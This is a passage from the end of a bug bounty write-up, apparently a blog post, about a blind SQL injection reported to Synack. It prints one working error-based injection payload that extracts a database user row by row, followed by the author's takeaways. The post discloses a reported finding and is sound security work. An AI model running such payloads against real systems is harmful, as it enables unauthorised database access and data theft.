+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)=&#39;</span>SYN_WAS<span style="color:#e6db74">&#39;)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#75715e">-- 112 characters
+</span></span></span></code></pre></div><p>If you change from &ldquo;<strong>SYN_WAS</strong>&rdquo; to something else like &ldquo;<strong>SYN_WAR</strong>&rdquo;, the application will send a false response. Confirming that our row dump is valid.</p>
+<p>Sent the report to Synack and they happily accepted the findings!</p>
+<h3 id="takeaways">Takeaways<a href="#takeaways" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Keep taking notes of your vulnerabilities. You never know when they will become useful.</li>
+<li>Bug bounties are often luck paired with hard work. If I had not found the SQL injections on this target in the past, I would never have guessed what naming structure the table names follow.</li>
+</ol>
+<p>I love doing technical discussions with the community! If you have a question about anything infosec-related, feel free to send me a DM on my <a href="https://twitter.com/kuldeepdotexe">Twitter</a>/<a href="https://www.instagram.com/kuldeepdotexe">Instagram</a>/<a href="https://www.linkedin.com/in/kuldeep-pandya-13a26a167/">LinkedIn</a>.</p>
+<p>EOF</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://kuldeep.io/posts/web-cache-deception-without-path-confusion/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Cache Deception Without Path Confusion</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://kuldeep.io/posts/escalating-privileges-with-ssrf/">
+                <span class="button__text">Escalating Privileges With SSRF</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="kuldeepdotexe" data-description="Support me on Buy me a coffee!" data-message="Thank you for reading. If you liked this, you can support this by buying me a coffee." data-color="#FF5F5F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<script src="https://kuldeep.io/assets/main.js"></script>
+<script src="https://kuldeep.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
